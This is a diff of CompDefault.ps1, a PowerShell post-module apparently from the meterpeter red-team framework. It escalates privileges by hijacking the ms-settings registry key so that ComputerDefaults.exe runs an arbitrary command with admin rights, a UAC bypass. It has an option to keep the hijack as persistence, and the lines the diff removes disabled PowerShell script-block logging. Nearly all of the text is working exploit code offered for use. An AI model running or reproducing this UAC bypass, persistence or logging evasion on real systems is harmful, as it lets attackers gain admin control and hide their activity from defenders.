@@ -82,15 +82,16 @@ If(-not($param1) -or $param1 -eq $null){
    Write-Host ".\CompDefault.ps1 `"Command to execute`""
    Write-Host ".\CompDefault.ps1 `"Command to execute`" -Force"
    Write-Host ".\CompDefault.ps1 `"Command to execute`" -Verbose"
-   Start-Sleep -Milliseconds 1200
+   Start-Sleep -Milliseconds 1500
 }Else{
    $Command = "$param1"
 }
 
+
 ## CompDefault meterpeter post-module banner
-$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+# $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 Write-Host "`nCompDefault v1.2 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
-Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
+Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 700
 
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\ms-settings" -EA SilentlyContinue
@@ -100,21 +101,21 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    If(-not(Test-Path -Path "$Env:WINDIR\System32\ComputerDefaults.exe") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
-      Write-Host "[ ] NOT FOUND: '$Env:WINDIR\System32\ComputerDefaults.exe'`n" -ForegroundColor red -BackgroundColor Black
+      Write-Host "[ ] NOT FOUND: '$Env:WINDIR\System32\ComputerDefaults.exe'`n"
       Exit
    }
 
    ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
    # This function 'reverts' all regedit hacks to the previous state before the EOP.
    If($param1 -eq "deleteEOP"){
-      Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 400
+      Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 700
       ## Make sure the vulnerable registry key exists
       If(Test-Path -Path "HKCU:\Software\Classes\ms-settings\shell\Open\Command" -ErrorAction SilentlyContinue){
          Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null;Start-Sleep -Seconds 1
-         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted." -ForegroundColor Green;Start-Sleep -Milliseconds 400
+         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted." -ForegroundColor Green;Start-Sleep -Milliseconds 700
          Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
       }Else{
-         Write-Host "[ ] Failed    => None CompDefault registry keys found under:" -ForegroundColor Red;Start-Sleep -Milliseconds 400
+         Write-Host "[ ] Failed    => None CompDefault registry keys found under:" -ForegroundColor Red -BackGroundColor Black;Start-Sleep -Milliseconds 700
          Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
       }
       If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
@@ -122,7 +123,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    }
 
    ## Anti-Virus registry Hive|Keys detection checks.
-   New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 100
+   New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 150
    If(-not(Test-Path "HKCU:\Software\Classes\ms-settings\shell\open\Command") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
@@ -131,35 +132,28 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
       Exit
    }
 
-   ## Disable AMSI Logging (Admin Shell)
-   If($IsClientAdmin -eq $True){
-      Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Yellow
-      New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 100
-      Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "0" -Type "DWORD" -Force -EA SilentlyContinue|Out-Null
-   }
-
    ## Add Entrys to Regedit { using powershell }
    Write-Host "[+] Hijacking => ComputerDefaults.exe execution in registry."
-   # New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 150
    ## The Next Registry entry allow us to execute our command under high privileges (Admin)
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null;Start-Sleep -Milliseconds 150
 
    ## Start the vulnerable Process { using powershell }
    Write-Host "[+] Hijacking => ComputerDefaults.exe process execution."
-   Start-Sleep -Milliseconds 2000;Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
+   Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
+   Start-Sleep -Milliseconds 3200 # Give time for ComputerDefaults.exe to finish
    ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
-   Start-Sleep -Milliseconds 200;If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
+   If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
 
-   Start-Sleep -Milliseconds 2800 # Give time for ComputerDefaults.exe to finish
    ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
       Write-Host "[+] Deleting  => EOP registry hacks (revert)"
-      Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null;Start-Sleep -Milliseconds 400
+      Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null
+      Start-Sleep -Milliseconds 700
    }Else{
-      Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Start-Sleep -Milliseconds 400
+      Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Start-Sleep -Milliseconds 700
       Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow
    }
 
@@ -275,14 +269,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 }Else{
    ## Vulnerable registry Hive => NOT FOUND
    Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
-   Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\ms-settings'`n" -ForegroundColor red -BackgroundColor Black
-}
-
-## Revert ScriptBlockLogging (default)
-If($IsClientAdmin -eq $True){
-   If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
-      Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
-   }
+   Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\ms-settings'`n"
 }
 
 ## Clean old files left behind by CompDefault after the job is finished ..
